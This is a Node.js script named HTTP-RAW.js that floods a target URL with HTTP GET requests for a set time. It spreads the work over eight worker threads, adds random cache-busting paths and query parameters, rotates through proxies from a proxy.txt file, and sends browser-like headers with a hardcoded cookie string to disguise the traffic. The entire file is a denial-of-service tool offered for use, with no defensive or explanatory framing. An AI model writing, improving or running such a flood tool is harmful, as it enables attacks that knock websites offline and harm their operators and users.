const fs = require('fs');
const axios = require('axios');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const uaFile = process.argv[4];

let userAgents = [];
try {
    userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    ];
} catch (e) {
    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)'];
}

const proxyFile = require('path').join(__dirname, 'proxy.txt');
let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p && /^[\d.:]+$/.test(p));
} catch (e) {
    proxies = [];
}

const THREADS = 8;
const REQUESTS_PER_INTERVAL = 500;
const INTERVAL_MS = 10;

if (isMainThread) {
    if (process.argv.length < 5) {
        console.log('Usage: node HTTP-RAW.js <target> <time> <useragents.txt>');
        process.exit(1);
    }
    if (proxies.length === 0) {
        console.log('[WARN] No proxies found in proxy.txt, running local requests only.');
    }
    for (let i = 0; i < THREADS; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                target, time, userAgents, proxies, REQUESTS_PER_INTERVAL, INTERVAL_MS
            }
        });
        worker.on('message', msg => {
            if (msg.type === 'status') {
                console.log(`[${msg.thread}] Status: ${msg.status} | Title: ${msg.title}`);
            }
        });
    }
} else {
    const { target, time, userAgents, proxies, REQUESTS_PER_INTERVAL, INTERVAL_MS } = workerData;
    const stop = Date.now() + time * 1000;
    const threadId = Math.floor(Math.random()*10000).toString(16);
    let success = 0, fail = 0, statusCounter = {};
    const isHttps = target.startsWith('https:');
    function extractTitle(data) {
        const match = /<title>(.*?)<\/title>/i.exec(data);
        return match ? match[1] : '';
    }
    function heavyCacheBustPath(url) {
        let path = url.pathname;
        if (Math.random() > 0.5) {
            path += '/' + Math.random().toString(36).substring(2, 10);
        }
        let params = url.search ? url.search + '&' : '?';
        for (let i = 0; i < 4; i++) {
            params += 'cb' + i + '=' + Math.random().toString(36).substring(2, 12) + '&';
        }
        params = params.slice(0, -1);
        return path + params;
    }
    function sendRequestViaProxy(proxy, url, options) {
        const [proxyHost, proxyPort] = proxy.split(':');
        options.host = proxyHost;
        options.port = parseInt(proxyPort);
        options.path = heavyCacheBustPath(url);
        options.headers = options.headers || {};
        options.headers['Host'] = url.hostname;
        const req = http.request(options, res => {
            let data = '';
            res.on('data', chunk => { data += chunk; });
            res.on('end', () => {
                statusCounter[res.statusCode] = (statusCounter[res.statusCode] || 0) + 1;
                success++;
                const title = extractTitle(data);
                if (parentPort) parentPort.postMessage({ type: 'status', status: res.statusCode, title, thread: threadId });
            });
        });
        req.on('error', () => { fail++; });
        req.end();
    }
    function sendRequestLocal(url, options) {
        options.path = heavyCacheBustPath(url);
        const reqModule = url.protocol === 'https:' ? https : http;
        const req = reqModule.request(options, res => {
            let data = '';
            res.on('data', chunk => { data += chunk; });
            res.on('end', () => {
                statusCounter[res.statusCode] = (statusCounter[res.statusCode] || 0) + 1;
                success++;
                const title = extractTitle(data);
                if (parentPort) parentPort.postMessage({ type: 'status', status: res.statusCode, title, thread: threadId });
            });
        });
        req.on('error', () => { fail++; });
        req.end();
    }
    function getCustomHeaders(userAgents, target) {
        return {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Cookie': 'X_CACHE_KEY=1140c41dfcfc0c8a4d8f4ee994f96dd5; _ga=GA1.1.349304346.1747578643; HstCfa4943580=1747578642861; HstCmu4943580=1747578642861; __dtsu=51A0174757864577D197935D6E4055F7; _cc_id=32d8bd2e6ffc378be8467d596b40e84d; panoramaId=a4141141c012e7f5737dc0239fa4185ca02c815c639ae6563547f5b293061f77; panoramaIdType=panoDevice; HstCnv4943580=5; HstCns4943580=5; panoramaId_expiry=1748301850863; 7df4261d8b6871670e1035b9688e7f1e=091ad23ad79f11ee725e58a7762e39e2; _ga_65MQTT185Q=GS2.1.s1747697048$o7$g1$t1747697145$j0$l0$h0; HstCla4943580=1747697145958; HstPn4943580=5; HstPt4943580=31',
            'Connection': 'keep-alive',
            'Referer': target
        };
    }
    let lastRequestTime = 0;
    function sendRequest() {
        if (Date.now() > stop) {
            process.exit(0);
        }
        if (Date.now() - lastRequestTime < 5000) return;
        lastRequestTime = Date.now();
        for (let i = 0; i < REQUESTS_PER_INTERVAL; i++) {
            const url = new URL(target);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                method: 'GET',
                headers: getCustomHeaders(userAgents, target),
                timeout: 5000
            };
            if (!isHttps && proxies && proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                sendRequestViaProxy(proxy, url, options);
            } else {
                sendRequestLocal(url, options);
            }
        }
    }
    setInterval(sendRequest, INTERVAL_MS);
}
